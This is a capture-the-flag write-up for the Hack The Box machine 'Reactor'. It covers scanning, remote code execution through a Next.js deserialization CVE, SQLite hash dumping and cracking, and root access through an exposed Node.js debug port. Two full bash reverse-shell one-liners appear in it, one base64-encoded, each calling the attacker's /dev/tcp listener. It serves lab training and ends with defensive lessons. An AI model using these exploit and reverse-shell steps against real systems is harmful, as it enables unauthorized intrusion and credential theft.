# HTB Write-Up: Reactor

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Reactor)      |
| Difficulty | Easy                                                             |
| OS         | Linux                                                            |
| Author     | Samurai                                                          |
| Date       | May 24, 2026                                                     |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — ReactorWatch Dashboard & Version Fingerprinting](#2-enumeration--reactorwatch-dashboard--version-fingerprinting)
3. [Initial Access — CVE-2025-55182 (React2Shell RCE)](#3-initial-access--cve-2025-55182-react2shell-rce)
4. [Lateral Movement — SQLite Credential Extraction & Hash Cracking](#4-lateral-movement--sqlite-credential-extraction--hash-cracking)
5. [Privilege Escalation — Node.js Debug Port Hijacking](#5-privilege-escalation--nodejs-debug-port-hijacking)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **Nmap** for service and version fingerprinting:

```bash
nmap -A -p- 10.129.1.198
```

**Open Ports:**

| Port | Service | Details                              |
|------|---------|--------------------------------------|
| 22   | SSH     | OpenSSH 9.6p1 (Ubuntu)              |
| 3000 | HTTP    | Next.js — ReactorWatch application  |

Only two ports were exposed. The Next.js application on port 3000 was the primary attack surface.

---

## 2. Enumeration — ReactorWatch Dashboard & Version Fingerprinting

### 2.1 — Web Application Fingerprinting

Initial fingerprinting with **WhatWeb** confirmed the technology stack and application title:

```bash
whatweb 10.129.1.198:3000
```

**Output:**

```
http://10.129.1.198:3000 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.1.198],
Script, Title[ReactorWatch | Core Monitoring System],
UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time],
X-Powered-By[Next.js]
```

The application is **ReactorWatch**, described as a *Nuclear Reactor Core Monitoring Dashboard*, running on **Next.js 15.0.3**.

### 2.2 — Unauthenticated Dashboard

Browsing to `http://10.129.1.198:3000` revealed a fully unauthenticated monitoring dashboard exposing live reactor telemetry and on-site personnel:

| Panel            | Details                                              |
|------------------|------------------------------------------------------|
| Core Status      | Reactor Power 98.2%, Criticality 1.0002 (WARNING)   |
| Core Temp        | 324°C                                                |
| Pressure         | 155 bar                                              |
| Coolant Flow     | 18.4 k m³/h (CAUTION)                               |
| Turbine Output   | 1.21 GW                                              |

**On-Site Personnel disclosed:**

| Name                | Role                  | Status  |
|---------------------|-----------------------|---------|
| Dr. Elena Rodriguez | Lead Nuclear Engineer | ONLINE  |
| Marcus Kim          | Senior Technician     | ONLINE  |
| James Thompson      | Safety Officer        | OFFLINE |

### 2.3 — Directory Enumeration

Directory fuzzing with **Feroxbuster** against the application identified a notable endpoint:

```bash
feroxbuster -u http://10.129.1.198:3000 -C 404 \
  --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```

**Notable finding:**

```
308  GET  http://10.129.1.198:3000/cgi-bin/ => http://10.129.1.198:3000/cgi-bin
```

The presence of a `/cgi-bin/` path on a Next.js application was unusual. Further investigation shifted focus to the Next.js framework version itself.

### 2.4 — Version Vulnerability Research

Next.js **15.0.3** is affected by **CVE-2025-55182**, a critical prototype pollution and unsafe deserialization vulnerability in the React Server Components handler — commonly referred to as **React2Shell**. This flaw allows an unauthenticated attacker to inject a malicious payload via the `Next-Action` header to achieve Remote Code Execution.

---

## 3. Initial Access — CVE-2025-55182 (React2Shell RCE)

### 3.1 — Vulnerability Background

The React Server Components (RSC) handler in Next.js 15.0.3 processes the `Next-Action` header without adequate sanitization. An attacker can inject a crafted payload exploiting prototype pollution and unsafe deserialization to execute arbitrary OS commands on the server. No authentication is required.

### 3.2 — RCE Verification

A public Python exploit for CVE-2025-55182 was used to confirm code execution:

```bash
python3 exploit.py --url http://10.129.1.198:3000 --cmd whoami
```

**Output:**

```
Success
node
```

```bash
python3 exploit.py --url http://10.129.1.198:3000 --cmd pwd
```

**Output:**

```
Success
/opt/reactor-app
```

The service runs as the low-privileged `node` user (`uid=999`).

### 3.3 — Reverse Shell

A base64-encoded reverse shell payload was used to avoid quoting issues:

```bash
echo 'bash -i >& /dev/tcp/10.10.14.130/9001 0>&1' | base64 -w 0
```

A listener was started on the attacker machine:

```bash
rlwrap nc -lnvp 9001
```

The payload was triggered via the exploit:

```bash
python3 exploit.py --url http://10.129.1.198:3000 \
  --cmd "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzAvOTAwMSAwPiYxCg== | base64 -d | bash"
```

**Result — Shell obtained as `node`:**

```
connect to [10.10.14.130] from (UNKNOWN) [10.129.1.198]
node@reactor:/opt/reactor-app$
```

---

## 4. Lateral Movement — SQLite Credential Extraction & Hash Cracking

### 4.1 — Application File Enumeration

The reactor application directory was enumerated:

```bash
ls -la /opt/reactor-app
```

**Key files identified:**

| File         | Notes                                        |
|--------------|----------------------------------------------|
| `.env`       | Application environment configuration        |
| `reactor.db` | SQLite database — readable by `node` user    |

### 4.2 — Database Credential Extraction

The SQLite database was opened and the `users` table was dumped:

```bash
sqlite3 /opt/reactor-app/reactor.db
```

```sql
.tables
SELECT * FROM users;
```

**Output:**

```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

Two MD5 password hashes were recovered for `admin` and `engineer`.

### 4.3 — Hash Cracking

The `engineer` hash was saved to a file and cracked with **John the Ripper**:

```bash
echo "39d97110eafe2a9a68639812cd271e8e" > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
```

**Output:**

```
reactor1         (?)
1g 0:00:00:00 DONE (2026-05-24 00:48) 50.00g/s 16857Kp/s
```

**Credential recovered: `engineer:reactor1`**

### 4.4 — SSH Access as Engineer

The cracked credentials were used to authenticate over SSH:

```bash
ssh engineer@10.129.1.198
```

**User flag retrieved from `/home/engineer/user.txt`.**

---

## 5. Privilege Escalation — Node.js Debug Port Hijacking

### 5.1 — Internal Service Enumeration

Open ports were enumerated from the `engineer` session:

```bash
ss -tulnp
```

**Key finding:**

```
tcp  LISTEN  0  511  127.0.0.1:9229  0.0.0.0:*
```

Port **9229** — the standard Node.js V8 Inspector/debugger port — was listening on localhost only. This port is used by Node.js processes launched with `--inspect`, allowing remote code evaluation via the Chrome DevTools Protocol.

### 5.2 — Identifying the Privileged Process

The `/opt/uptime-monitor/` directory contained a Node.js uptime monitoring worker:

```bash
cat /opt/uptime-monitor/worker.js
```

This script runs as a persistent service probing the ReactorWatch application every 30 seconds. Process inspection confirmed it was running as **root**, exposing the debug port on `127.0.0.1:9229`.

### 5.3 — SSH Port Forwarding

Since the debug port was bound to localhost, an SSH tunnel was created to expose it to the attacker machine:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.1.198
```

### 5.4 — Attaching to the Node.js Debugger

The Node.js built-in inspector client was used to connect:

```bash
node inspect 127.0.0.1:9229
```

**Output:**

```
connecting to 127.0.0.1:9229 ... ok
debug>
```

### 5.5 — Code Execution as Root

Direct use of `require` failed in the debug context. Using `process.mainModule.require` to access the module system succeeded:

```javascript
exec("process.mainModule.require('child_process').execSync('id').toString()")
```

**Output:**

```
'uid=0(root) gid=0(root) groups=0(root)\n'
```

The worker process was confirmed to be running as **root**. A reverse shell was triggered from the debug console:

```javascript
exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.130/9002 0>&1\"').toString()")
```

**Listener on attacker machine:**

```bash
rlwrap nc -lnvp 9002
```

**Result — Root shell obtained:**

```
connect to [10.10.14.130] from (UNKNOWN) [10.129.1.198]
root@reactor:~#
```

**Root flag retrieved from `/root/root.txt`.**

---

## 6. Summary

| Phase                   | Technique                                                              | Result                              |
|-------------------------|------------------------------------------------------------------------|-------------------------------------|
| Recon                   | Nmap -A                                                                | Ports 22, 3000 identified           |
| Fingerprinting          | WhatWeb + page source                                                  | Next.js 15.0.3 — CVE-2025-55182    |
| Initial Access          | React2Shell exploit via `Next-Action` header injection                 | Shell as `node`                     |
| Credential Extraction   | SQLite database dump → MD5 hashes                                      | `engineer:reactor1` recovered       |
| Hash Cracking           | John the Ripper + rockyou.txt                                          | Password cracked                    |
| Lateral Movement        | SSH with cracked credentials                                           | Shell as `engineer` + user flag     |
| Privilege Escalation    | Node.js debug port (9229) via SSH tunnel → `process.mainModule.require` | Root shell + root flag             |

### Key Takeaways

- **Unauthenticated dashboards are not just an information disclosure risk.** The ReactorWatch panel exposed personnel names and the technology stack — contextual information that frames the entire attack. Even a read-only dashboard deserves authentication.

- **Framework version disclosure is a direct path to exploitation.** The `X-Powered-By: Next.js` header combined with WhatWeb fingerprinting pinpointed the exact version, making CVE lookup trivial. Suppressing or obscuring version headers raises the bar for attackers meaningfully.

- **SQLite databases embedded in web applications are a high-value credential store.** Applications that bundle their database alongside source code — especially when the service account can read it — make credential extraction a single command. Secrets should be stored outside the web root with strict permissions.

- **Node.js `--inspect` on a privileged process is equivalent to a root shell.** The Chrome DevTools Protocol provides unrestricted JavaScript execution inside the target process. Any root-owned Node.js service running with `--inspect` or `--inspect-brk` on localhost should be treated as a privilege escalation vector, particularly when SSH access to a low-privileged account is available for port forwarding.
